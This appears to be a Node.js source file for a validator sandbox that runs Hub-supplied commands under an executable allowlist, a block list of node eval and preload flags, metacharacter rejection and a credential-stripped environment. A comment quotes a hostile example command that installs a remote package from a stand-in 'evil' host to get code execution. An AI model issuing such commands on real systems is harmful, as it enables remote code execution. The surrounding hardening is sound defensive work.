// src/gep/validator/sandboxExecutor.js
//
// Runs validation commands provided by the Hub inside an isolated sandbox
// directory with strict resource/time limits, and does NOT trust the capsule
// or gene payload -- we only execute commands exactly as Hub sent them,
// inside a fresh empty working directory, with network blocked by convention
// and output truncated to a small size.
//
// Security posture:
//  - Never run inside the evolver's own workspace or repo root.
//  - Create a fresh temp directory per task; wipe after execution.
//  - Per-command timeout defaults to 60s, hard cap 120s.
//  - Total batch timeout defaults to 180s.
//  - Collect stdout/stderr truncated to 4000 chars each to match
//    ValidationReport.command.stdout/stderr schema on the Hub.
//
// This module is intentionally simple and has no external dependencies.
'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');

const DEFAULT_CMD_TIMEOUT_MS = 60_000;
const MAX_CMD_TIMEOUT_MS = 120_000;
const DEFAULT_BATCH_TIMEOUT_MS = 180_000;
const MAX_OUTPUT_CHARS = 4000;

// Hard allowlist of executables the Hub-provided validation command may invoke.
// Any command whose first token is not in this set is rejected before spawn().
// This prevents command injection via Hub-delivered task.command strings even
// if Hub itself is compromised or mis-signs a task.
//
// GHSA-jxh8-jh77-xh6g: `npm` and `npx` used to be on this allowlist. They are
// arbitrary-code-execution-by-design (npm runs preinstall/install/postinstall
// lifecycle scripts; npx fetches and runs remote package `bin` entries), so a
// compromised/MitM'd Hub could issue `validation_commands: ["npm install
// https://evil/evil.tgz"]` and get RCE on every validator in one poll cycle.
// Validator nodes only ever need to run `node <script>`, so we drop npm/npx.
// Any legitimate validation that previously used `npx vitest run ...` must be
// rewritten by the gene author to `node node_modules/vitest/vitest.mjs ...`.
const ALLOWED_EXECUTABLES = new Set(['node']);

// Depth-in-depth: even though `node` is in ALLOWED_EXECUTABLES, reject the
// flags that turn it into an arbitrary-code evaluator. A legitimate Hub-
// delivered validation command should always be `node <script-file> [args]`,
// never `node -e "..."` or `node --require ./attacker-preload`. This closes
// the gap where validation_commands go straight from Hub to runInSandbox
// without passing through policyCheck.isValidationCommandAllowed().
const BLOCKED_NODE_FLAGS = new Set([
  '-e', '--eval',
  '-p', '--print',
  '-i', '--interactive',
  '-r', '--require',
  '--loader',
  '--experimental-loader',
  '--import',
  '--env-file',
]);

function assertNodeCommandSafe(parsed) {
  if (parsed.executable !== 'node') return;
  for (const arg of parsed.args) {
    const flag = arg.split('=')[0];
    if (BLOCKED_NODE_FLAGS.has(flag)) {
      throw new Error('node flag not allowed in sandbox: ' + flag);
    }
  }
  const firstPositional = parsed.args.find((a) => !a.startsWith('-'));
  if (!firstPositional) {
    throw new Error('node requires a script file argument in sandbox (inline eval is not allowed)');
  }
}

// Parse a command string into executable + argv array, supporting single and
// double quotes. This is a minimal parser and does NOT expand environment
// variables, globs, redirects, pipes, or subshells. If the command string
// contains shell metacharacters that cannot be parsed, we reject it.
//
// Returns { executable, args } on success, or throws on parse failure.
function parseCommand(cmdString) {
  if (typeof cmdString !== 'string') {
    throw new Error('command must be a string, got ' + typeof cmdString);
  }
  const tokens = [];
  let buf = '';
  let quote = null; // '\'' | '"' | null
  for (let i = 0; i < cmdString.length; i++) {
    const ch = cmdString[i];
    if (quote) {
      if (ch === quote) {
        quote = null;
      } else {
        buf += ch;
      }
      continue;
    }
    if (ch === '\'' || ch === '"') {
      quote = ch;
      continue;
    }
    if (ch === ' ' || ch === '\t' || ch === '\n') {
      if (buf.length > 0) {
        tokens.push(buf);
        buf = '';
      }
      continue;
    }
    // Reject shell metacharacters that would give injection leverage even with
    // shell:false. A legitimate validation command should never contain these.
    if (ch === '|' || ch === '&' || ch === ';' || ch === '>' || ch === '<' || ch === '`' || ch === '$') {
      throw new Error('shell metacharacter not allowed in command: ' + ch);
    }
    buf += ch;
  }
  if (quote) throw new Error('unterminated quote in command');
  if (buf.length > 0) tokens.push(buf);
  if (tokens.length === 0) throw new Error('empty command');
  return { executable: tokens[0], args: tokens.slice(1) };
}

function safeNumber(v, fallback) {
  const n = Number(v);
  if (!Number.isFinite(n) || n <= 0) return fallback;
  return n;
}

function truncate(str, limit) {
  if (typeof str !== 'string') return '';
  if (str.length <= limit) return str;
  return str.slice(0, limit) + '\n...[truncated]';
}

function createSandboxDir() {
  const base = path.join(os.tmpdir(), 'evolver-validator');
  if (!fs.existsSync(base)) {
    fs.mkdirSync(base, { recursive: true, mode: 0o700 });
  }
  const name = 'task_' + Date.now().toString(36) + '_' + crypto.randomBytes(4).toString('hex');
  const dir = path.join(base, name);
  fs.mkdirSync(dir, { mode: 0o700 });
  return dir;
}

function cleanupDir(dir) {
  if (!dir) return;
  try {
    fs.rmSync(dir, { recursive: true, force: true });
  } catch (_) {
    // non-fatal
  }
}

function buildSandboxEnv() {
  // Minimal env: strip credential-bearing vars. Redirect HOME / TMPDIR to an
  // os.tmpdir() path so that any child process that tries to read ~/.npmrc,
  // ~/.ssh/*, ~/.aws/credentials, or similar host-credential files ends up
  // in an empty scratch directory instead of the real user home.
  // PATH is preserved so that node remains resolvable -- the
  // ALLOWED_EXECUTABLES allowlist is the real gate against unwanted tools.
  const tmp = os.tmpdir();
  const fallbackPath = process.platform === 'win32'
    ? 'C:\\Windows\\System32'
    : '/usr/local/bin:/usr/bin:/bin';
  return {
    PATH: process.env.PATH || fallbackPath,
    HOME: tmp,
    USERPROFILE: tmp,
    TMPDIR: tmp,
    TMP: tmp,
    TEMP: tmp,
    LANG: 'C.UTF-8',
    LC_ALL: 'C.UTF-8',
    NODE_ENV: 'sandbox',
    EVOLVER_SANDBOX: '1',
  };
}

function runSingleCommand(cmd, opts) {
  const options = opts || {};
  const timeoutMs = Math.min(
    safeNumber(options.timeoutMs, DEFAULT_CMD_TIMEOUT_MS),
    MAX_CMD_TIMEOUT_MS,
  );
  const cwd = options.cwd;
  const env = buildSandboxEnv();

  return new Promise((resolve) => {
    let child;
    let parsed;
    try {
      parsed = parseCommand(String(cmd));
      assertNodeCommandSafe(parsed);
    } catch (err) {
      resolve({
        cmd: String(cmd),
        ok: false,
        stdout: '',
        stderr: 'command_parse_failed: ' + (err && err.message ? err.message : String(err)),
        exitCode: -1,
        durationMs: 0,
        timedOut: false,
      });
      return;
    }
    if (!ALLOWED_EXECUTABLES.has(parsed.executable)) {
      resolve({
        cmd: String(cmd),
        ok: false,
        stdout: '',
        stderr: 'executable_not_allowed: ' + parsed.executable
          + ' (allowed: ' + Array.from(ALLOWED_EXECUTABLES).join(', ') + ')',
        exitCode: -1,
        durationMs: 0,
        timedOut: false,
      });
      return;
    }
    try {
      child = spawn(parsed.executable, parsed.args, {
        shell: false,
        cwd,
        env,
        stdio: ['ignore', 'pipe', 'pipe'],
      });
    } catch (err) {
      resolve({
        cmd: String(cmd),
        ok: false,
        stdout: '',
        stderr: 'spawn_failed: ' + (err && err.message ? err.message : String(err)),
        exitCode: -1,
        durationMs: 0,
        timedOut: false,
      });
      return;
    }

    let stdout = '';
    let stderr = '';
    let settled = false;
    const startedAt = Date.now();

    const timer = setTimeout(() => {
      if (!child.killed) {
        try { child.kill('SIGKILL'); } catch (_) {}
      }
      if (!settled) {
        settled = true;
        resolve({
          cmd: String(cmd),
          ok: false,
          stdout: truncate(stdout, MAX_OUTPUT_CHARS),
          stderr: truncate(stderr + '\n[killed by sandbox timeout]', MAX_OUTPUT_CHARS),
          exitCode: -1,
          durationMs: Date.now() - startedAt,
          timedOut: true,
        });
      }
    }, timeoutMs);

    child.stdout.on('data', (d) => {
      stdout += d.toString('utf8');
      if (stdout.length > MAX_OUTPUT_CHARS * 2) {
        stdout = stdout.slice(-MAX_OUTPUT_CHARS * 2);
      }
    });
    child.stderr.on('data', (d) => {
      stderr += d.toString('utf8');
      if (stderr.length > MAX_OUTPUT_CHARS * 2) {
        stderr = stderr.slice(-MAX_OUTPUT_CHARS * 2);
      }
    });

    child.on('error', (err) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      resolve({
        cmd: String(cmd),
        ok: false,
        stdout: truncate(stdout, MAX_OUTPUT_CHARS),
        stderr: truncate(stderr + '\n' + (err && err.message ? err.message : String(err)), MAX_OUTPUT_CHARS),
        exitCode: -1,
        durationMs: Date.now() - startedAt,
        timedOut: false,
      });
    });

    child.on('exit', (code, signal) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      const exitCode = typeof code === 'number' ? code : (signal ? -1 : -1);
      resolve({
        cmd: String(cmd),
        ok: exitCode === 0,
        stdout: truncate(stdout, MAX_OUTPUT_CHARS),
        stderr: truncate(stderr, MAX_OUTPUT_CHARS),
        exitCode,
        durationMs: Date.now() - startedAt,
        timedOut: false,
      });
    });
  });
}

/**
 * Run a list of validation commands in a fresh sandbox directory.
 * Stops at the first failure and returns partial results.
 *
 * @param {string[]} commands
 * @param {{ cmdTimeoutMs?: number, batchTimeoutMs?: number, keepSandbox?: boolean }} [opts]
 * @returns {Promise<{
 *   results: Array<{ cmd: string, ok: boolean, stdout: string, stderr: string, exitCode: number, durationMs: number, timedOut: boolean }>,
 *   overallOk: boolean,
 *   sandboxDir: string,
 *   durationMs: number,
 *   stoppedEarly: boolean,
 * }>}
 */
async function runInSandbox(commands, opts) {
  const options = opts || {};
  const cmds = Array.isArray(commands) ? commands.filter((c) => typeof c === 'string' && c.trim()) : [];
  const startedAt = Date.now();

  if (cmds.length === 0) {
    return {
      results: [],
      overallOk: false,
      sandboxDir: null,
      durationMs: 0,
      stoppedEarly: false,
      reason: 'no_commands',
    };
  }

  const batchTimeoutMs = Math.min(
    safeNumber(options.batchTimeoutMs, DEFAULT_BATCH_TIMEOUT_MS),
    DEFAULT_BATCH_TIMEOUT_MS * 3,
  );

  const sandboxDir = createSandboxDir();
  const results = [];
  let stoppedEarly = false;

  try {
    for (const cmd of cmds) {
      const elapsed = Date.now() - startedAt;
      if (elapsed >= batchTimeoutMs) {
        stoppedEarly = true;
        break;
      }
      const remaining = batchTimeoutMs - elapsed;
      const r = await runSingleCommand(cmd, {
        cwd: sandboxDir,
        timeoutMs: Math.min(
          safeNumber(options.cmdTimeoutMs, DEFAULT_CMD_TIMEOUT_MS),
          remaining,
        ),
      });
      results.push(r);
      if (!r.ok) {
        stoppedEarly = true;
        break;
      }
    }
  } finally {
    if (!options.keepSandbox) cleanupDir(sandboxDir);
  }

  const overallOk = results.length > 0 && results.every((r) => r.ok) && !stoppedEarly;

  return {
    results,
    overallOk,
    sandboxDir: options.keepSandbox ? sandboxDir : null,
    durationMs: Date.now() - startedAt,
    stoppedEarly,
  };
}

/**
 * Self-test to confirm the validator host can spawn a `node <script>` process
 * inside the sandbox successfully. Used by the validator daemon at startup to
 * decide whether to participate at all -- if the local toolchain cannot even
 * run `node a-trivial-script.js`, the daemon will refuse to start and print a
 * user-visible warning instead of flooding the Hub with env_fail reports.
 *
 * @returns {Promise<{ok: boolean, reason?: string, exitCode?: number, durationMs: number, stderrTail?: string}>}
 */
async function runPreflight() {
  const sandboxDir = createSandboxDir();
  const startedAt = Date.now();
  const scriptPath = path.join(sandboxDir, '__evolver_preflight.js');
  try {
    fs.writeFileSync(scriptPath, "process.stdout.write('preflight_ok\\n');\nprocess.exit(0);\n", { encoding: 'utf8' });
    const r = await runSingleCommand('node __evolver_preflight.js', {
      cwd: sandboxDir,
      timeoutMs: 10_000,
    });
    if (!r.ok) {
      return {
        ok: false,
        reason: r.timedOut
          ? 'preflight_timeout'
          : (typeof r.exitCode === 'number' && r.exitCode !== 0 ? 'preflight_exit_nonzero' : 'preflight_failed'),
        exitCode: r.exitCode,
        durationMs: r.durationMs,
        stderrTail: typeof r.stderr === 'string' ? r.stderr.slice(-240) : '',
      };
    }
    return { ok: true, exitCode: r.exitCode || 0, durationMs: Date.now() - startedAt };
  } catch (err) {
    return {
      ok: false,
      reason: 'preflight_exception',
      durationMs: Date.now() - startedAt,
      stderrTail: err && err.message ? String(err.message).slice(-240) : '',
    };
  } finally {
    cleanupDir(sandboxDir);
  }
}

module.exports = {
  runInSandbox,
  runSingleCommand,
  runPreflight,
  createSandboxDir,
  cleanupDir,
  buildSandboxEnv,
  parseCommand,
  assertNodeCommandSafe,
  ALLOWED_EXECUTABLES,
  BLOCKED_NODE_FLAGS,
  DEFAULT_CMD_TIMEOUT_MS,
  MAX_CMD_TIMEOUT_MS,
  DEFAULT_BATCH_TIMEOUT_MS,
  MAX_OUTPUT_CHARS,
};
